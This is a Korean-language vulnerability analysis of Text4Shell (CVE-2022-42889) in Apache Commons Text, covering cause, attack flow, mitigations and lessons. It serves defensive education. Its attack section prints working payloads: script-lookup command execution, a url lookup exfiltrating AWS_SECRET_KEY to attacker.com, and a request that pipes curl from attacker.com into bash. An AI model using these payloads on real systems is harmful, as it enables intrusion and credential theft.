# CVE-2022-42889 - Apache Commons Text RCE (Text4Shell)

## 개요

| 항목 | 내용 |
|------|------|
| CVE ID | CVE-2022-42889 |
| CVSS | 9.8 (Critical) |
| 영향 소프트웨어 | Apache Commons Text |
| 영향 버전 | 1.5 ~ 1.9 |
| 수정 버전 | 1.10.0 |
| 공격 유형 | RCE (Remote Code Execution) |
| 발견일 | 2022-10-13 |

## 영향 범위 & 심각성

Apache Commons Text는 Java 생태계에서 문자열 처리를 위해 광범위하게 사용되는 라이브러리다. Spring Boot, Apache Camel 등 수많은 프레임워크와 엔터프라이즈 애플리케이션이 직·간접적으로 의존한다.

**실제 영향:**
- Log4Shell(CVE-2021-44228) 이후 "Text4Shell"로 불리며 업계 긴급 대응 촉발
- 사용자 입력이 `StringSubstitutor`를 통과하는 모든 Java 서비스가 잠재적 공격 대상
- Maven Central 기준 수천 개 프로젝트가 취약한 버전에 의존
- 클라우드 마이크로서비스, 데이터 파이프라인, API 게이트웨이 등 광범위한 인프라 영향

## 취약점 기술 분석

### 근본 원인

`StringSubstitutor` 클래스는 문자열 내 변수를 보간(interpolation)하는 기능을 제공한다. 기본적으로 다음 Lookup이 활성화되어 있었다:

- `script` — Java ScriptEngine을 통한 스크립트 실행
- `dns` — DNS 조회
- `url` — URL 콘텐츠 가져오기

```java
// 취약한 코드 패턴
StringSubstitutor interpolator = StringSubstitutor.createInterpolator();
String result = interpolator.replace(userInput);
```

사용자 입력에 `${script:javascript:...}` 형태의 문자열이 포함되면, ScriptEngine이 임의의 JavaScript를 실행한다.

### 핵심 문제

1. **기본 활성화된 위험한 Lookup**: script, dns, url Lookup이 opt-out 방식
2. **입력 검증 부재**: 보간 대상 문자열에 대한 안전성 검증 없음
3. **권한 분리 미흡**: 문자열 처리 유틸리티가 코드 실행 권한을 가짐

## 공격 시나리오

### 단계별 공격 흐름

1. **정찰**: 대상 서비스가 사용자 입력을 StringSubstitutor로 처리하는지 확인
2. **페이로드 주입**: HTTP 파라미터, 헤더, 본문에 악성 보간 문자열 삽입
3. **코드 실행**: 서버에서 임의 명령 실행

```
# DNS 기반 탐지 (Out-of-band)
${dns:address|attacker.com}

# Script 기반 RCE
${script:javascript:java.lang.Runtime.getRuntime().exec('id')}

# URL 기반 데이터 유출
${url:UTF-8:https://attacker.com/exfil?data=${env:AWS_SECRET_KEY}}
```

### 실제 공격 요청 예시

```http
POST /api/template HTTP/1.1
Content-Type: application/json

{
  "greeting": "Hello ${script:javascript:new java.lang.ProcessBuilder(['bash','-c','curl attacker.com/shell.sh|bash']).start()}"
}
```

## 방어 방법

### 즉시 조치
1. **Apache Commons Text 1.10.0 이상으로 업그레이드** (Lookup 기본 비활성화)
2. 업그레이드 불가 시 `StringSubstitutor`에서 script, dns, url Lookup 수동 제거

### 코드 레벨 방어
```java
// 안전한 사용법 - 필요한 Lookup만 명시적으로 등록
Map<String, StringLookup> lookups = new HashMap<>();
lookups.put("env", StringLookupFactory.INSTANCE.environmentVariableStringLookup());
StringSubstitutor sub = new StringSubstitutor(
    StringLookupFactory.INSTANCE.interpolatorStringLookup(lookups, null, false)
);
```

### 인프라 레벨 방어
- WAF 규칙: `${script:`, `${dns:`, `${url:` 패턴 차단
- 네트워크 이그레스 필터링으로 아웃바운드 연결 제한
- 의존성 스캐너(Snyk, Dependabot)로 취약 버전 탐지 자동화

## 교훈

1. **기본값의 중요성**: 위험한 기능은 opt-in이어야 한다
2. **Log4Shell의 교훈 미반영**: 동일 패턴(문자열 보간 → 코드 실행)이 반복됨
3. **의존성 깊이 관리**: 전이 의존성으로 취약 버전이 포함될 수 있음
4. **최소 권한 원칙**: 문자열 유틸리티에 코드 실행 능력을 부여하는 설계는 위험

## 참고 자료

- [NVD - CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)
- [Apache Commons Text Security Advisory](https://commons.apache.org/proper/commons-text/security.html)
- [Rapid7 분석 - Text4Shell](https://www.rapid7.com/blog/post/2022/10/17/cve-2022-42889-keep-calm-and-stop-satisfying/)
- [GitHub Advisory GHSA-599f-7c49-w659](https://github.com/advisories/GHSA-599f-7c49-w659)
